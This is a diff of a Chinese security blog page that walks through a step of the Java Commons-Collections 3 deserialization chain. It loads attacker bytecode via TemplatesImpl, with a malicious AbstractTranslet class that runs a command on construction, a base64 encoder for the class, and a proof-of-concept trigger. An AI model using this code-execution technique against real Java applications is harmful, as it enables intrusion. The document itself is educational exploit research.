+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">    Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    filed.setAccessible(true);</span><br><span class="line">    filed.set(obj, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那么到这里我们的POC可以编写为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class cc3 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] bytes = Base64.getDecoder().decode(&quot;字节码base64编码&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那么正常情况下，我们这里应该已经可以正常进行命令执行</p>
+<p>那么我们这里编写一个命令执行的恶意代码类：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后编译一下把字节码base64编码一下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public class bianma &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String filePath = &quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class\\&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] classBytes = readClassFile(filePath);</span><br><span class="line">            String base64Encoded = convertToBase64(classBytes);</span><br><span class="line">            System.out.println(base64Encoded);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static byte[] readClassFile(String filePath) throws IOException &#123;</span><br><span class="line">        try (FileInputStream fis = new FileInputStream(filePath);</span><br><span class="line">             ByteArrayOutputStream baos = new ByteArrayOutputStream()) &#123;</span><br><span class="line">            byte[] buffer = new byte[4096];</span><br><span class="line">            int bytesRead;</span><br><span class="line">            while ((bytesRead = fis.read(buffer)) != -1) &#123;</span><br><span class="line">                baos.write(buffer, 0, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            return baos.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static String convertToBase64(byte[] data) &#123;</span><br><span class="line">        return Base64.getEncoder().encodeToString(data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们直接把我们的POC运行一下：</p>
+<p>但是并没有执行命令</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175110466.png"
+                      alt="image-20230802175110466"
+                ></p>
+<p>然后是报了一个空指针错误在defineTranslectClasses里面</p>
+<p>但是这个不太好找</p>
+<p>然后我们这里打断点跟进调试一下：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175023651.png"
+                      alt="image-20230802175023651"
+                ></p>
+<p>跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175259884.png"
+                      alt="image-20230802175259884"
+                ></p>
+<p>然后我们可以看到这里类加载是已经成功了</p>
+<p>然后我们继续跟进</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802175419393.png"
+                      alt="image-20230802175419393"
+                ></p>
+<p>然后我们可以看到就是在这个if判断里面报了一个空指针错误</p>
+<p>然后这个if就是检查我们传入字节码是不是<code>ABSTRACT_TRANSLET</code>的子类</p>
+<p>然后是的话会对<code>_transletIndex</code>进行一个赋值，不是的话，就会跳转到我们报空指针错误的地方</p>
+<p>那我们这里解决办法有两个：</p>
+<p>1、给_auxCLasses赋值，解决这个空指针报错</p>
+<p>2、使if判断为真也就是我们传入的字节码为<code>ABSTRACT_TRANSLET</code>的子类</p>
+<p>但是我们往下看还有一个if判断：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (_transletIndex &lt; 0) &#123;</span><br><span class="line">             ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">             throw new TransformerConfigurationException(err.toString());</span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里也就是<code>_transletIndex</code> 值小于0就直接抛出异常</p>
+<p>而且我们现在的<code>_transletIndex</code> 值是-1</p>
+<p>所以我们给_auxCLasses赋值不可行，因为这样无法过第二个if，仍然会报错</p>
+<p>所以我们这里要使我们传入的字节码为<code>ABSTRACT_TRANSLET</code>的子类</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802180950718.png"
+                      alt="image-20230802180950718"
+                ></p>
+<p>跟进到这个类里面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802180931720.png"
+                      alt="image-20230802180931720"
+                ></p>
+<p>可以看到这个类是一个抽象类，那他的子类就要实现它的抽象方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802181053462.png"
+                      alt="image-20230802181053462"
+                ></p>
+<p>所以我们构造的恶意类就要实现这个transform抽象方法</p>
+<p>那我们这里重新构造一个恶意类</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class HelloTemplatesImpl extends AbstractTranslet &#123;</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers)</span><br><span class="line">            throws TransletException &#123;&#125;</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator,</span><br><span class="line">                          SerializationHandler handler) throws TransletException &#123;&#125;</span><br><span class="line">    public HelloTemplatesImpl() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>那么我们的POC就可以构造为：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public class blog &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Templates templates = new TemplatesImpl();</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;D:\\MAVEN\\maven-repository\\cc6\\cc61\\src\\main\\java\\leijiazai\\HelloTemplatesImpl.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates,&quot;_name&quot;,&quot;111&quot;);</span><br><span class="line">        setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field filed = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        filed.setAccessible(true);</span><br><span class="line">        filed.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230802181259643.png"
+                      alt="image-20230802181259643"
+                ></p>
+<p>可以看到已经成功运行了。但是这里我们并没有进行newInstance()，但是依然弹出了计算器，</p>
 <p>那我们这里就打断点整体分析一下：</p>
 <p><img  
                      lazyload
@@ -807,7 +913,7 @@
         <li><strong>创建于:</strong> 2023-07-31 20:49:24</li>
         
             <li>
-                <strong>更新于:</strong> 2023-07-31 20:57:18
+                <strong>更新于:</strong> 2023-08-02 20:06:28
             </li>
         
         <li>
@@ -836,6 +942,21 @@
 
             
                 <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/08/02/CommonCollections3%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">CommonCollections3利用链分析</span>
+                                    <span class="post-nav-item">上一篇</span>
+                                </span>
+                            </a>
+                        </div>
                     
                     
                         <div class="article-next">
